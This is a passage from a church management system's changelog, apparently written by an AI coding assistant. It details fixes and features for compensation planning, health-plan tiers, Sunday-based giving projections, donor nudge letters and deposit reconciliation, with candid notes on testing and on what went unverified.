save — a stored count with no UI left to clear it is the invisible-stuck-state bug this codebase
has hit before.

**The transcription is self-checking**: the tier rates times the real enrollment reconstruct the
packet's own printed Total Monthly ($4,102.00) and Total Annual ($49,224.00) exactly, so a mistyped
rate breaks a test rather than quietly costing the budget. Every pre-existing health figure in the
planner tests reproduces unchanged, because an even split and a tier lookup agree when everyone is
Family.

Also: `finCompPerHouseholdDiffCents()` reads the breakeven's per-household premium gap off the two
tier rates instead of dividing a group total, so it stays right on a mixed roster (Renewal to
Option 1 is still $4,045.80/yr, as before); the dependents checkbox no longer moves anyone between
tiers, since with four tiers a dependents flag no longer implies one; premiums are shown to the cent
(`finCompMoneyCents`) because that is how they are quoted and typed; and a legacy annual
`medicalCents` override is dropped when a tier rate is typed over it, so the new rate is not
silently outranked by the old figure.

`npm test` (803/803, 18 new in `test/finance-health-tiers.test.js`); each verified non-vacuous by
injecting the exact regression it guards — a mistyped rate, a reverted even split, an un-cleared
legacy override, a re-inferred tier, a cash-only worker counted as a contract — all five failed as
they should. Plus `node --check` on both built bundles, a div-balance scan of the assembled
`CHMS_HTML` and of all five rendered views, and a mixed-roster harness confirming the enrolled
workers' health lines sum exactly to the group quote at that enrollment. Not verified in a live
browser.
(`src/frontend/js-finance.js`, `test/finance-health-tiers.test.js`,
`test/finance-compensation-planner.test.js`, `test/finance-salary-calculator.test.js`,
`test/finance-part-time.test.js`)

### v1.146.0 — Compensation: current pay entered by hand (2026-08-06)

A worker whose wages sit INSIDE a budget line shared with other staff — the daycare director paid
out of the daycare payroll account, say — had no way to be costed correctly. Linking them to that
account read the whole line (several people's wages) as one person's pay; leaving them unlinked read
nothing at all. Either way "No raise", COLA and Custom were all computed off a wrong number, with
nothing on screen to say so.

New **FY{base} current pay** box on the worker drawer (`finCompCurrentPayChange` /
`finCompClearCurrentPay`), writing `w.actualSalaryCents`. The read side already existed in
`finCompCurrentPayCents` but nothing had ever set it — a legacy field left reachable by the pre-FIN54
layout and orphaned by the redesign. An entered figure beats the account lookup for that worker only;
the box shows the account figure as its placeholder, and a "use the budget line" link clears it. It
persists with the roster, so no new endpoint or migration.

The drawer note was also factually wrong and is corrected: it claimed "the plan total is applied back
to it", but `finCompSendToBudget` writes one grand total to a single chosen salary account, never
per-worker.

`npm test` (785/785, 7 new); each new test verified non-vacuous by removing the `actualSalaryCents`
read and confirming 3 of them fail. Not verified in a live browser.
(`src/frontend/js-finance.js`, `test/finance-compensation-planner.test.js`)

### v1.145.0 — Compensation: part-time staff (FTE marker + cash-salary-only) (2026-08-06)

Asked for a checkbox to exclude part-time employees from the health plan, disability and so on —
"they are just cash salary, very part time" — then, in a follow-up, for a percentage-of-time marker
("so they are a 20% employee or something"). Both built.

**`cashOnly` (checkbox)** removes pension, disability and health. It deliberately does **not**
remove employer FICA: that is owed on any W-2 wage however few the hours, so dropping it would
understate what the church actually pays. A minister's FICA is already handled by the separate SECA
toggle, which is a different question — tax status, not hours. Flagged to the user rather than
decided silently.

**`ftePct` (number)** scales the **district benchmark**, never the salary. The salary is whatever is
really budgeted; the benchmark is what it should be measured against. This matters more than it
sounds: without it, a 20%-time worker on $8,000 reads as **15% of scale** on the Council report —
alarming, and meaningless, because nobody is proposing to pay them a full-time wage. Pro-rated, the
same salary reads as **75% of scale**, which is a real and answerable question. A fairly-paid
part-timer can now come out green, which the full-time comparison could never produce.

Second-order consequences handled rather than left to surface as noise:
- The **LCMS market median comparison is suppressed** for a part-timer on the Council summary.
  Concordia's published ranges are full-time figures; holding a 20% wage against one prints an
  alarming red number that means nothing.
- **Cost-to-full-scale** adds no pension or disability for a cash-only worker — raising their
  salary pulls up employer FICA and nothing else.
- The **health plan view** shows them as "Not eligible", not enrolled at $0, and they are out of the
  group health total.
- The **Council report** states plainly why they draw no benefits, and that FICA still applies.
- A part-timer left benefits-eligible gets a **nudge** ("at 20% of full time this worker is still
  shown as benefits-eligible") rather than a silent assumption either way — FTE and eligibility are
  related but not the same thing, and Concordia's hours floor is roughly half time, so coupling them
  automatically would be wrong.

**Verification.** `npm test` (778/778, 16 new in `test/finance-part-time.test.js`). Every new test
checked for vacuity by injecting the exact regression it guards — cash-only wrongly dropping FICA,
the benchmark not pro-rating, and a part-timer held against a full-time median — all three failed as
they should. One test assertion was **corrected rather than forced**: it asserted a part-timer would
stop reading red, but the fixture worker genuinely is 25% below their own pro-rated scale, so the
assertion now pins the real demonstration (15% → 75%) and a second test covers the fairly-paid case.
**Not verified**: a live browser.

(`src/frontend/js-finance.js`, `test/finance-part-time.test.js`)

### v1.144.0 — Year-end projections move from a month basis to a Sunday one (2026-08-06)

Reported from the Giving board page: the projections "look like you are taking the current month
as a complete month," with the suggestion to work in weeks of the year instead — week X against
week X of last year, then carry the remaining weeks forward.

Confirmed, and it was two errors pulling the same way:

1. **The prior-year comparison was not like-for-like.** This year's giving through an in-progress
   month was compared against last year's giving through that month **complete** (the SQL bound
   the prior window at `priorYear-MM-31`).
2. **Sundays that had not happened yet were counted as elapsed.** `sundaysElapsedInYear(year,
   throughMonth)` counted every Sunday through the *end* of the month.

Both understate, so on any date except a month end the projection came out low — and a council
report that quietly understates year-end giving is the wrong kind of wrong.

**The unit is now Sundays, not calendar weeks or months**, because that is when this congregation
actually gives. "Through 31 Sundays, against last year's first 31 Sundays" is like-for-like in a
way "through July against through July" is not: two Julys can hold four Sundays or five.

New pure helpers in `api-utils.js`: `periodAsOfDate()` (the real as-of date — today when the chosen
month is still running), `sundaysElapsedThroughDate()`, `sundaysInYear()` (52 **or 53** — assuming
52 drops a real week of giving in those years), `nthSundayOfYear()` (the prior-year window bound),
`monthElapsedFraction()`. `projectYearEnd()` takes an options object on the new basis and reports
`sundays_elapsed`/`sundays_in_year`/`sundays_remaining` alongside the figure.

**The method is unchanged and deliberately so.** The projection still carries last year's remaining
Sundays forward *scaled by the pace this year is actually running*, so a year behind stays behind
rather than catching up by December. Only the basis was wrong, not the arithmetic on top of it.

**Two things fixed alongside, same root cause:**
- **"Vs. this point last year"** used the same month-boundary slice; it now uses the Sunday-bounded
  prior figure — which also removed a second, differently-bounded source of truth for one quantity
  (`priorCum` from a monthly slice vs `priorYtd` from the fund query, which disagreed mid-month).
- **Budget-to-date** charged a whole month the congregation had not reached, then reported the gap
  as a shortfall. `spreadBudgetYtd()` takes a `finalMonthFraction` (defaulting to 1, so nothing
  else changes) and charges the part-month.

The narrative now states its own basis — "counted through 31 of 52 Sundays, with 21 still to
come, against last year through its own first 31" — because the basis is exactly what was wrong,
and a council figure nobody can check is worse than one they can argue with.

**Verification.** `npm test` (762/762). The projection tests were rewritten for the new basis and
two fixtures corrected: they had set `prior_cents` and `priorMonthly` to *different* values for the
same quantity, which is the duplication this removed. Every new assertion checked for vacuity by
injecting the exact regression it guards — the complete-current-month, the 52-Sunday assumption,
and the whole-part-month budget — all three failed as they should. **Not verified**: a live browser
or real D1 data.

(`src/api-utils.js`, `src/api-reports.js`, `src/frontend/js-giving.js`, `test/giving-board.test.js`,
`test/giving-fund-categories.test.js`)

### v1.143.0 — Giving Nudges: send the plateau analysis as mail (2026-08-06)

Asked for a Communications tab for the Plateaus & Nudges report, "so we can communicate these
nudges." Scoped with the user first (`AskUserQuestion`) rather than guessed, because "a tab for it"
could mean a nav shortcut or a real send flow, and the send flow contains a pastoral decision:
**full send flow**, with letters **naming each recipient's own figures**.

New **Giving → Communications → Giving nudges** pane. Pick a year, fund, grouping and ask level
(Modest/Standard/Generous); get a recipient list with each giver's current level, what they're
invited to, and what it's worth; select; Email or Print. Sends land in the same
`giving_letter_sends` ledger the Letters pane uses (new `letter_type` `nudge`), so a run is
resumable and nobody is asked twice — printing records too, since printing is a send.

**Figures are stated in the rhythm each giver actually gives in.** This was the user's own
follow-up ("if they are monthly or annual givers note that") and it turned out to matter more than
it sounds. The analysis normalizes everyone to a weekly-equivalent figure so a weekly regular and a
single December stock gift are comparable — right for the analysis, wrong for the letter. New pure
`classifyGivingCadence()` / `cadenceAmountCents()` and per-giver `cadence*` fields put a monthly
giver's letter in months and an annual giver's in years.

**Three real bugs found while building it, each caught by a harness rather than by reading:**
1. **The pane would have rendered an empty list, always.** `computeGivingPlateaus()` returns
   `summary`/`tiers`/`distribution` — never a flat `givers` array, which is what addressing a
   letter needs. Now returned, and stripped back out of the plateaus report response so that
   payload doesn't double.
2. **A giver of exactly $200/month would have been told they give $199.** $2,400/yr is $46.15/wk →
   rounds to $46/wk → back out as $199.33/mo. Double-rounding through the weekly-equivalent. The
   cadence figure is now derived from the annualised total directly. A letter that misstates
   someone's own giving by a dollar is precisely the credibility failure this feature exists to
   avoid.
3. **The letter's own numbers disagreed with each other.** "+$60 a month" sat next to "about $728
   over a year" ($60 × 12 = $720; $728 came from the weekly-derived figure). New
   `cadence_annual_delta_cents` is rebuilt from the rounded cadence delta, so every figure in one
   letter reconciles. Both annual figures are kept and commented — the analysis one still totals
   the report's headline upside.

**The giver query is now shared, not copied** (`fetchGivingPlateauRows` in `api-utils.js`). The
report and the letters run the identical query, so the list written to can never be a different set
of people than the list reviewed. A test asserts neither module keeps a private copy.

Two existing tests changed, both for real reasons rather than to go green: `giving-letters.test.js`
counted six letter types (now seven), and `giving-plateaus.test.js` asserted a weekly giver and a
one-time giver get byte-identical options. The second is the interesting one — it is still true of
the *analysis* fields, and deliberately false of the new *cadence* fields, so the assertion was
narrowed to the analysis fields and a companion test added asserting the cadence presentation
does differ.

**Verification.** `npm test` (757/757; 30 new in `test/giving-nudges.test.js`, which runs the real
helpers against a real in-memory SQLite database and the real letter builder out of the built
bundle). Every new test checked for vacuity by injecting the exact regression it guards — the
double-rounding, raw-count cadence, the non-reconciling annual figure, and the missing giver list —
all four failed as they should. Plus `node --check` on the built bundle and all three touched
backend modules, and a tag-balance scan of the assembled `CHMS_HTML`. **Not verified**: a live
browser, a real email send, or a real print dialog.

**The letter copy is drafted and should be read before any real send.** It thanks the giver, states
what they currently give, names one concrete next step, and frames it as "an invitation and never
an expectation" — but it is my wording, not the pastor's.

(`src/api-utils.js`, `src/api-giving.js`, `src/api-reports.js`, `src/frontend/js-giving.js`,
`src/frontend/html-tabs.js`, `test/giving-nudges.test.js`, `test/giving-plateaus.test.js`,
`test/giving-letters.test.js`)

### v1.142.0 — Compensation Planner redesign + Council report (2026-08-06)

Built from the `design_handoff_compensation_planner` bundle (README + a fully-interactive planner
prototype carrying the whole calculation engine + a printable Council report). Replaces
`finRenderCompensation()` and everything it rendered — four stacked cards and several hundred
words of prose become **five views behind one sub-nav**, with a persistent navy totals strip so no
input is ever on a different screen from its consequence:

| View | Answers |
| --- | --- |
| 1 · Set pay | What do we pay each worker next year? |
| 2 · Check fairness | Is that fair, against the district scale and Concordia's published ranges? |
| 3 · Health plan | Which group plan, and who sits on which tier? |
| This year's rates | Every figure that arrives on paper once a year, entered once. |
| Council summary | The one-page version for a meeting. |

**The one deliberate maths change (§5.4).** COLA and Custom now grow the worker's **current pay**;
only District Scale runs the district formula. Before this, all three growth methods computed from
the district table, so for a year with a published base salary they showed the identical number —
which read as a bug and made a COLA impossible to express. FY2027 has a published base, so this is
the state the tab was actually in. `finWorkerScenarioSalaryCents` / `finSalaryComputeAll` /
`finDistrictProposalCents` are replaced by `finCompMethodSalaryCents` / `finCompComputeAll` /
`finCompWorksheetCents`.

**Every pure function the district and Concordia maths is built on is untouched** —
`finComputeLcmsSalary`, `finLcmsMultiplierFor`, `finRoundSalaryCents`,
`finComputeEmployerFicaCents`, `finComputePensionCents`, `finConcordiaPensionRateFor`,
`finConcordiaDisabilityRateFor`, `finComputeHealthPlanTotalCents`, the four breakeven functions,
`finAccountBudgetCentsForCode`. `test/finance-salary-calculator.test.js` (which reconciles them
against the published PDFs) needed no changes at all.

**One place for annual figures.** `_finSalaryReferenceByYear[year]` grew from
`{baseSalaryCents, healthOptOutCents}` to also carry `pensionPct`, `ficaPct`,
`disabilityDepsPct`, `disabilityNoDepsPct`, `ssaColaPct` and the three provenance strings.
Resolution is entered-for-the-year → most recent earlier entered year → code constant, and the UI
says which of the three it used rather than silently substituting. The code constants
(`CONCORDIA_*_BY_YEAR`, `SSA_COLA_REFERENCE_PCT`, `LCMS_MO_BASE_SALARY_BY_YEAR`) stay as the seed.

**Migration, on read.** The old roster-wide `_finSalaryPensionPct` / `_finSalaryDisabilityPct`
overrides and the `colaSource` growth key move into the new per-year shape via
`finCompMigrateSavedShape()`. Left as globals they would have kept applying with no UI left to
clear them — the invisible-stuck-state class of bug. A worker's health tier likewise derives an
explicit `healthMode` from the old `healthEnrolled`/`hasDependents` pair, keeping both in sync.

**The Council report** (`finCompCouncilReportHtml`, `body.printing-comp`) is a purpose-built
flowing document — cover with a drafted motion and the cost-to-full-scale alternative, a page per
worker, the group health plan, and every reference figure with its source — not the workspace with
its chrome hidden, because the layout is genuinely different.

**Three real problems the tests caught before shipping:**
1. The new CSS introduced a fourth breakpoint (600px). `test/breakpoints.test.js` (MOB3) failed —
   the codebase agreed on exactly three tiers (767/900/1100). Moved in place, not relocated, so
   the cascade order that decides which rule wins is unchanged.
2. Removing a worker spliced the roster but left `_finCompPerWorkerMethod` / `_finCompOverrides`
   keyed by the old indexes, silently moving every later worker's settings onto their neighbor.
   Both maps are now re-indexed.
3. The employee-only and opt-out premium boxes on view 3 were editable for a non-admin.

**Verification.** `npm test` (729/729; `test/finance-compensation-planner.test.js` rewritten to 42
tests covering the handoff's §10 acceptance checks, with §5.12's worked example reproduced to the
cent — $103,600 / $107,380 / $106,470 / $107,250, church cost $147,661, 99% of scale, 103% of
median). Every new test was checked for vacuity by injecting the exact regression it guards
(reverting §5.4, rounding the imported budget figure, dropping the re-index, counting
report-less workers in the median total, letting a half-typed range count) — all five failed as
they should. Plus: `node --check` on both built app-JS bundles, a tag-balance scan of the
assembled `CHMS_HTML` and of all five rendered views, confirmation that `#fin-panel-compensation`
still sits inside `.content-area` (the TAP2-BUG class), that all 29 inline handlers named in the
rendered markup exist, and that all 32 of them run without throwing. The served bundle was swept
for the `String.raw` double-escape/backtick bug class — the only 3 hits are pre-existing and in
`js-giving.js`. **Not verified**: a live browser or a real print dialog — the standing caveat on
all frontend work here.

(`src/frontend/js-finance.js`, `src/frontend/html-head.js`, `src/frontend/html-tabs.js`,
`test/finance-compensation-planner.test.js`, `test/finance-input-typing.test.js`)

### v1.141.0 — Compensation Planner: Salary Options / MO District Calculator / Concordia comparisons (2026-08-05)

Four reported problems with the Compensation tab, plus one real bug found while fixing them.

**1. The "None (flat)" column is no longer editable.** It is the worker's current budget, read
straight from their linked payroll account — an edit box sitting on an imported figure invited
people to type over data that was already correct. It renders as a plain figure now. A previously
stored typed override still resolves (so no saved data quietly changes meaning) and shows a
one-click "use account figure" link; there is no longer any way to create a new one.

**2. The roster table is the "MO District Calculator" and it now actually calculates for the
target year.** Reported as "that calculator is not calculating for this year… it ends up with 2026
numbers." Cause: its Salary column rendered `finSalaryComputeAll`'s ACTIVE-scenario figure, and the
active scenario is normally "None (flat)", which resolves to the base year's account budget — so a
table whose entire purpose is a FY2027 district-formula proposal was displaying FY2026 budget
figures. New pure `finDistrictProposalCents(w)` runs the district formula for the TARGET year
unconditionally, independent of which scenario is active; the column is labeled "FY2027 District
Proposal" and its footer totals the proposals. The redundant "FY2026 Acct Actual" column is gone
(the same account figure already drives the None column above). The three per-worker benefit
toggles that lived in that table (SECA, Has Dependents, Health Plan) moved down into Total
Compensation, next to the costs they actually drive — the calculator's inputs are now formula
inputs only.

**3. The scenario table is labeled "Salary Options."**

**4. New "Concordia Plans Comparisons" card**, built from the three real Compensation Decision
Support Tool reports run 2026-07-21 (Dinger — Pastor-Senior Administrative, 20 yrs, Masters;
Knapp — Director of Parish Music, 20 yrs; Thompson — Director of Christian Education, 22 yrs),
transcribed verbatim rather than approximated. Each worker gets a horizontal range chart (hand-
rolled SVG, same as every other chart here — the grouped-bar helper can't express a low/mid/high
range) plotting every range Concordia published on one shared dollar scale, with two dashed
markers across them: what the church budgets today and what the MO District Calculator proposes
for FY2027. Each range's midpoint is also carried up as a reference column in Salary Options, per
the request. Concordia's parish-professional report carries no District section at all, so those
two ranges are simply absent for the non-pastor workers rather than zero-filled — the chart plots
4 ranges for the pastor and 2 each for the others, while the editable table still offers all four
rows so a future report that does carry them can be typed in. Every figure is editable and
persists through the existing Save button (no new endpoint, no migration); the seed only fills a
worker who has no Concordia data yet, so an admin edit is never overwritten. Inputs are disabled
for non-admins, matching the District Reference Data card.

**Real bug found by the new tests, fixed:** FIN43's per-paycheck $5 rounding was being applied to
the *imported* budget figure as well as to formula proposals, so $74,516 of real budget displayed
as $74,490 and $73,034 as $73,060 — up to $65/yr of drift on a number the UI presents as "what is
budgeted." Rounding now applies only when the figure is a proposal; an imported figure is reported
to the cent. A proposal is still an exact whole multiple of a clean $5 paycheck (asserted).

**Verified:** `npm test` (706/706, 17 new in `test/finance-compensation-planner.test.js`, which
loads the real built bundle in a `vm` and renders against a roster shaped like the live one). Every
assertion was checked for vacuity against the pre-change code — each marker it looks for inverts
cleanly (the removed `fin-salary-actual-` input and " Acct Actual" header existed before and are
gone; the new headings did not exist before and do now). Also `node --check` on both built app-JS
bundles and a tag-balance scan of the fully rendered Compensation tab (61/61 divs, 157/157 cells,
3/3 svgs). **Not verified:** a live browser — no browser exists in this environment, so the charts'
actual layout at real widths and the disabled-input rendering were confirmed structurally, not
visually.


### v1.140.0 — Giving consolidation: Offerings · Reports · Communications · Settings (2026-08-05)

Built from the `design_handoff_giving_consolidation` bundle (README + two `.dc.html` prototypes).
Three changes, all in one pass: the sub-nav collapses eight tabs to four, Batches/Transactions/
Deposits become one Offerings workflow with real many-to-many batch↔deposit links, and the board
report gains a fund-category lens.

**1. Sub-nav: eight → four.** `Offerings · Reports · Communications · Settings`. Every retired view
name still resolves — `givSetView()` maps `batches`/`transactions`/`deposits` → Offerings,
`board`/`analysis` → Reports, `letters`/`receipts` → Communications, and remembers which *pane*
inside the new home the old name meant, so an existing "Go to Letters" button or a bookmark lands
on the actual screen rather than the parent tab. An unknown name falls back to Offerings instead of
leaving every panel hidden.

**2. Offerings.** New work-queue strip (open batches / awaiting deposit / unreconciled deposits /
processing fees YTD, all derived live from `GET /admin/api/giving/offerings-summary` — nothing
stored, so the queue can't claim work that's already done). Master/detail below it, with the
batch list badged by a **derived** status: `Needs deposit` → `Split · $X left` → `Unreconciled` →
`Deposited` (`batchDepositStatus()`/`batchDepositStatusFromCounts()` in `api-utils.js`, unit-tested
including the $0-bank-amount and sub-dollar-rounding edges). The batch detail gained a **Bank
deposits panel**: a coverage bar, one editable card per linked deposit (amount from this batch /
deposit total / bank received / fees), the reverse direction of each link ("Also in this deposit:
Aug 11 · Online (ACH batch) $4,120"), and a shortfall strip when part of the count hasn't reached a
bank yet.

New `giving_deposit_lines(deposit_id, batch_id, amount_cents)` join table (migration `0032`) — 0031
could only express one deposit per *gift*, which cannot say "half of Sunday's count went in Monday
and half Wednesday." A deposit's given total is now Σ its lines when it has lines, and Σ its
assigned gifts otherwise — **never their sum**, so a deposit built both ways can't double-count
itself. New endpoints: `POST`/`DELETE /giving/deposit-lines`, `GET /giving/deposit-options`,
`GET /giving/offerings-summary`; `POST /giving/deposits` optionally creates its first line so
"+ New deposit" never leaves a half-made slip behind, and removing the last line deletes the
deposit. The old flat gift table and deposit list are kept as pills inside Offerings (the handoff's
option A) — they answer questions the master/detail can't; the gift table gained a **Deposit**
column.

Caught while writing the batch-list query: joining `giving_entries` **and** `giving_deposit_lines`
in one `GROUP BY` multiplies the rows and silently doubles a split batch's total. The deposit
figures come in as correlated subqueries instead; a regression test splits a batch across two
deposits specifically so that bug can't come back unnoticed.

**3. Fund lens on Reports.** New `funds.category` (`general | earned | passive | restricted`,
migration `0033`), edited in a new **Settings → Fund categories** card (category + annual budget per
fund, saved on an explicit click). `giving-board` now returns a fully-computed block per category
plus `all` (`buildBoardCategoryBlock()` in `api-utils.js`), so switching the lens is instant and the
five positions are computed by one function over different slices — the four categories add back up
to All giving, which a test asserts directly. Everything is scoped: KPIs, chart, navy panel,
narrative, fund table (which lists *categories* as rows under the All-giving lens and *funds* under
a category lens), the subtitle scope note, and print. The old "+ $X other giving" sub-line is
replaced by the **Everything else** strip — one clickable chip per other category.

Two real bugs this surfaced, both fixed:
- The month chart's fixed 50k-step/100k-minimum axis was written for the General Fund. Against
  passive income — a couple of thousand dollars for the *whole year* — every bar rounded to zero
  height and the chart read as a flat line. Replaced with a 1/2/5-×-power-of-ten "nice step"
  (`boardNiceStepK()`) targeting ~3 gridlines, plus axis labels that carry enough decimals to stay
  distinguishable below $1k. The handoff's named steps (50/20/5/1) are rungs on that same ladder.
- `boardNarrativeHtml()` indexed `mix.check.pct` directly and would throw — blanking the whole
  narrative page — for any method bucket the response didn't carry. Now a safe lookup.

The **Plateaus & Nudges** and **Weekly/Monthly Band** cards moved out of the board page into
Analysis, per the handoff; the board page now ends at the fund table. Analysis is the third position
of the mode toggle (`Dashboard · Narrative · Analysis`), and the lens and period persist across
modes. Print honors the lens: the selected category's pages, then a one-page summary of the others,
injected only for the duration of the print job. If Analysis is the mode on screen, "Print board
page" switches back to Dashboard first — otherwise it would print a sheet whose body is
`display:none`.

**Three more real bugs, found by a review pass against a real in-memory database and fixed:**
- The board's household and method-mix queries grouped by `f.category` in SQL, but the legacy
  General-Fund-family fallback lives in JS — so on an un-backfilled database the default lens
  showed a General Fund YTD figure next to **zero households and a blank navy panel**, with the
  real numbers filed under Restricted. Both queries now group by `fund_id` and map to a category
  through the same JS `catOf` map everything else uses; there is now one source of truth for
  which category a fund is in.
- `fees_ytd` computed `Σ deposit lines − bank_cents`. A deposit built the older per-gift way has
  no lines, so its fee came out as a large **negative** number — the year's processing fees
  reading as a windfall. It now follows the same lines-else-gifts rule as the deposit list.
- "Awaiting deposit" counted every batch with no deposit line — which, on the day this ships, is
  *every batch in the database*, since batch↔deposit links only start existing now. It would have
  announced years of money still sitting in the safe. Windowed to the last 90 days (adjustable via
  `?awaiting_days=`), with the window named on the card.

**A second review pass found four more, all confirmed against a running harness and fixed:**
- **The Deposits pane reported a huge negative fee for every deposit the new workflow builds.**
  It read `gross_cents` (the per-gift assignment total), but the Offerings panel links whole
  *batches* and never sets `giving_entries.deposit_id` — so a $7,100 deposit banked at $7,090
  showed `Deposited · fee $10` in the batch panel and `Given $0.00 · Fees −$7,090.00` in the
  Deposits pane, which is the screen a bookkeeper reconciles from. The backend had been returning
  the correct `given_cents` all along and nothing consumed it. Fixed in the list, the detail and
  `depRecalcFees()`; the detail now also lists the batches a lines-built deposit holds, and the
  list says "1 batch" rather than "0 gifts".
- **Deleting a batch orphaned its deposit links**, permanently inflating the deposit — and because
  the deposits *list* reaches lines by subquery while the *detail* joins `giving_batches`, the two
  views of that deposit then disagreed with nothing to recompute them. The same gap existed at
  every place batch rows are removed, including the orphan purge that runs after **every Breeze
  giving sync and CSV import**. All seven sites now clear the links. That exposed one more: an
  emptied deposit still carrying a bank figure yielded `0 − bank` as a fee, so a deposit holding
  nothing is now skipped by the fee total outright.
- **The Attendance tab's "Giving × Attendance → Open" button landed on the wrong screen.** Before
  this change `giv-view-reports` *was* the Analysis tile grid; now it's the board dashboard. Points
  at `analysis` (through the alias map that exists for exactly this) instead.
- `unreconciled_deposits` was unbounded while its sibling card had just gained a window — an old
  slip left unreconciled under the earlier flow would pin the card open forever. Same window now.
Two smaller ones: the search box's placeholder promised gift and donor search from a control that
only filters batches by description and date (relabeled), and the `funds/categories` comment
claimed a sparse-write guarantee the loop doesn't have (comment corrected to describe what the
code actually protects — and why not to widen the UPDATE).

**One hardening while in here.** `applyPermissionUI()` hides `.require-finance` panels by setting
an inline `display:none`, which the view-switching loop would cheerfully undo — so an alias or a
stale deep link could park an office-level user on an empty Reports panel. `givSetView()` now
refuses to open a finance-only view (and `givOffSetPane()` the Deposits pane) for a role that
can't see it, falling back to Offerings. The server gated the data all along; this is about not
showing an empty screen.

**Compatibility.** A database that has the `category` column but has never been backfilled falls
back to the old name-prefix rule (every fund sharing the leading numeric code of the fund named
"General Fund"), so the council's headline number can't read $0 between deploy and first visit to
Settings; `db.js` backfills that same family once, marker-gated so a later re-categorization isn't
undone on every cold start.

**Verification.** `npm test` (689/689, 79 new across `test/giving-fund-categories.test.js`,
`test/giving-offerings.test.js`, `test/giving-consolidation-ui.test.js` — the last runs the real
served `JS_GIVING` in a `vm` sandbox). Each new test file was checked for vacuity by injecting the
regression it guards (dropped alias map → 3 fail; multiplying JOIN → 1 fail; lens always reading
`all` → 8 fail; fixed 100k axis → 1 fail; skipped deposit cleanup → 1 fail). `node --check` on both
built app-JS bundles and on every touched backend file; div-balance scan of the rebuilt
`#tab-giving` markup. Dead CSS removed with the markup it styled (`.giving-layout`,
`.batch-list-panel`, `.batch-detail-panel`, `.batch-row` + children, `.batch-search-wrap`).
**Not verified**: a live browser or a real D1 database — the standing caveat on all frontend work
here. Worth checking first on the live app: the coverage-bar/shortfall interaction on a real split
batch, and that the work-queue counts match what the panels below them show.

### v1.139.0 — Phone-first pass: Dashboard & People (2026-08-04)

Phase C of the mobile scope. MOB1–MOB4 stopped things being *broken* on a phone; this is the
first pass aimed at what a phone user actually needs on the two screens they open most — and, for
the member tier, essentially the only two.

**Checked first what was already handled, and deliberately did not redo it.** The person profile
already stacks and swaps its side rail for a dropdown at 900px (`.pv2-nav` → `.pv2-nav-select`);
the People list already becomes contact cards at 767px; tapping one already opens the full
profile, which is a better mobile answer than the quickview panel and means that panel staying
hidden is correct rather than a gap. The scope doc's "needs a mobile equivalent for the quickview"
is therefore already satisfied by the card → full-profile path.

What was missing was ergonomics, not structure:

**People — search stays reachable.** `.tab-panel.active` is the scroll container and `.toolbar` is
a normal flex item inside it, so the search box and Filters button scrolled away the moment you
moved down the list — on a directory whose entire purpose is looking someone up. The toolbar is
now `position:sticky` on phones, with a background and negative margins that bleed it over
`.tab-panel`'s own padding so cards disappear behind it cleanly. Scoped to `#tab-people .toolbar`,
not `.toolbar`: the same bar is used by several tabs and this pass is chartered for two screens.

**People — the result count is visible again.** The pager sits *below* the list on phones (the
MOB2-era ordering), so there was no way to see how many results a search returned without
scrolling past 25 cards. New phone-only `#p-count-mobile` under the toolbar, populated by
`renderPeoplePager()` itself so the two can never disagree; hidden on desktop, where the pager is
already on screen.

**Dashboard — density.** The 20px grid gaps and 20–24px card padding are tuned for a 1440px
desktop; on a 390px screen they spend a third of the width on whitespace and push the second row
of numbers below the fold. Gaps, padding and header sizes tightened on phones only. Stat tiles
stay **2-up** — 1-up would be legible but would turn four numbers into four screens of scrolling.
The nested `.dash-stat-quad-grid` 2×2 goes to one column: at ~85px a cell it was unreadable.

**Verified:** `npm test` 613/613, 15 new in `test/phone-first-pass.test.js`. Re-verified against
three breakages: block removed (10 fail), sticky leaked to every tab instead of People (10 fail),
and the desktop dashboard gap changed instead of the phone one (the "changes nothing on desktop"
test fails).

One test needed fixing before it was worth anything: `winningDecl('.toolbar', …)` also matched
`#tab-people .toolbar`, so the scoping check found our own rule and asserted the opposite of the
truth. It now respects selector boundaries and verifies both halves — no bare `.toolbar` gets
sticky, and `#tab-people .toolbar` is the only rule that does.

**Not verified:** a real phone. Every change is spacing and stickiness, which is exactly the class
that needs eyes — particularly whether the sticky toolbar's height leaves enough room for cards
on a short screen.


### v1.138.0 — Board Report: Sunday-based projection fallback, "By Fund" table grouped by fund
code (2026-08-05)

Two more follow-ups on the General Fund KPI work (v1.123.0), reported after seeing real data.
(1) **Year-End Projection's straight-line fallback now extrapolates off Sundays elapsed, not
months.** The seasonal path (scale by last year's same-point trend) was already correct and
unchanged; it's only the fallback used when there's no prior-year data to scale from that
mattered here — it was `YTD * (12/monthsElapsed)`, a monthly basis that doesn't match this
church's actual weekly giving rhythm. `projectYearEnd()` (`src/api-utils.js`) gained an optional
5th `sundaysElapsed` param; when given, the fallback becomes `YTD * (52/sundaysElapsed)` instead
(`method: 'linear-weekly'`). New `sundaysElapsedInYear(year, throughMonth)` counts real Sundays
from Jan 1 through the end of the given month — verified against real calendar dates for both a
normal and a leap year. (2) **The Board Report's own "By Fund" table never got the numeric-prefix
grouping the Giving by Fund report already has (G22)** — it listed every fund flatly, so all the
small "40085 Advent"/"40085 Donor Advise"/"40085 Lent" seasonal sub-funds scattered around the
list as their own rows instead of folding into the "40085 General Fund" line a board actually
wants to see, which read as noise ("nonsense numbers"). `boardFundTableHtml()`
(`src/frontend/js-giving.js`) now groups by the same leading numeric code and renders a
collapsible "(N funds — click to expand)" header + subtotal, mirroring `rptToggleFundGroup`'s
exact UX via a new `boardToggleFundGroup()`. `npm test` (598/598, 4 new tests for the weekly
projection fallback and `sundaysElapsedInYear`, hand-verified against real 2026/2024 calendar
dates), `node --check` on both rebuilt app-JS bundles. Not verified in a live browser.
(`src/api-utils.js`, `src/api-reports.js`, `src/frontend/js-giving.js`, `test/giving-board.test.js`)

### v1.136.0 — Finance: root-caused and fixed the "boxes don't type correctly" bug (2026-08-05)

Reported again, with an explicit instruction to find the cause before coding — four prior fixes
(FIN42/FIN48/FIN49/FIN50) had each addressed a real but different symptom and left the actual
cause untouched. Investigated by simulating real keystrokes through the shipped
`finSanitizeDecimalInput` rather than reasoning about the code, which reproduced it immediately:
typing `1234.56` produced **$123,456** in the per-worker Opt-Out box and **$56** in the District
Reference Data Health Opt-Out box.

**Root cause — a lossy controlled-input round-trip, not a browser quirk.** Every dollar/percent
box on the Compensation tab is fully controlled: each keystroke converts the text to canonical
cents, then the whole card re-renders and writes `cents/100` straight back into the box. The
moment you type `.`, the buffer is `"1234."` → `parseFloat` → `1234` → the box is rewritten as
`"1234"` and the decimal point is deleted, so the next two digits land as whole dollars. Two
